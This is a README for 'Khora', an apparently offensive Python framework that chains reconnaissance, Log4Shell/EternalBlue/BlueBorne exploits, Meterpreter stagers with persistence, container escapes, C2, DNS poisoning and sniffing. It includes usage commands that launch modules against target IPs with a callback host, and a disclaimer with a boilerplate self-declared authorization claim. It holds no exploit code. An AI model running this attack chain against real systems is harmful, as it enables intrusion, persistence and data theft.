
# Khora Security Testing Framework v2.0

Khora is a **modular Python-based security testing framework** designed for
**authorized penetration testing and attack simulation** in controlled environments
(e.g. labs, training networks, HTB-style setups).

The framework focuses on **attack-chain simulation**, allowing individual modules
to be executed independently or as a full assessment workflow.

---

## ⚠️ Legal & Ethical Notice

> **This framework is intended for educational and authorized security testing only.**  
> The author is **not responsible** for misuse, illegal activity, or damage caused by this tool.  
> Use only on systems you own or have **explicit written permission** to test.

---

## Features

- Modular architecture with a unified execution interface
- Full-chain or single-module execution
- Cross-platform core (Linux / Windows)
- Linux-only support for low-level Bluetooth exploitation
- Designed for security research, learning, and controlled testing

---

## Architecture Overview

> khora-framework/
> ├── README.md                 # <- Readme file
> ├── client.py                 # main orchestrator
> ├── modules/
> │   ├── nmap_module.py        # full vuln scanning
> │   ├── RCE_module.py         # struts2/log4shell/shellshock
> │   ├── backdoor_module.py    # linux/windows stagers + persistence
> │   ├── blueborne_module.py   # bluetooth RCE
> │   ├── cracker_module.py     # hashcat NTLM/SHA/kerberos
> │   ├── jailbreaking_module.py   # docker/k8s escapes
> │   ├── c2_module.py          # HTTP/TCP C2 server
> │   ├── dns_spoof_module.py   # scapy DNS poisoning
> │   ├── sniffer_module.py     # wifi/BLE packet capture
> │   └── eternalblue_module.py # MS17-010
> ├── payloads/                 # generated stagers
> ├── results/                  # results output
> └── requirements.txt       # python dependencies

## Module List

```bash
MODULES (10)

Recon:         nmap_module.py    → nmap_tcp.txt, nmap_vuln.txt
RCE:           rce_module.py     → Struts2/Log4Shell reverse shell
Backdoors:     backdoor_module.py→ linux_x64_meter.elf, win_meter.exe
Bluetooth:     blueborne_module.py→ CVE-2017-0785 L2CAP crash
Cracking:      cracker_module.py → NTLM/SHA256/Kerberos cracked.txt
Jailbreak:     jailbreak_module.py→ Docker/K8s root escape
C2:            c2_module.py      → HTTP stager + TCP handler
DNS Spoof:     dns_spoof_module.py→ Scapy DNS poisoning
Sniffer:       sniffer_module.py → WiFi/BLE devices.txt
SMB:           eternalblue_module.py→ MS17-010 EternalBlue

USAGE

```bash
git clone <repo>
cd khora-exploit
pip3 install -r requirements.txt
python3 client.py 10.10.11.59 10.10.14.1

# Single module  
python3 client.py 10.10.11.59 10.10.14.1 -m rce
python3 client.py 10.10.11.59 10.10.14.1 -m eternalblue

TARGET: 192.168.1.100
LHOST:  10.10.14.1:4444



"""
DISCLAIMER
----------

this tool is only for Penetration Testing in authorized environments.
The author is not responsible for any misuse or damage caused by this tool.
Use at your own risk. (I have permission and am authorized to perform this pentest)

Socials 
-------
Discord : 2b53
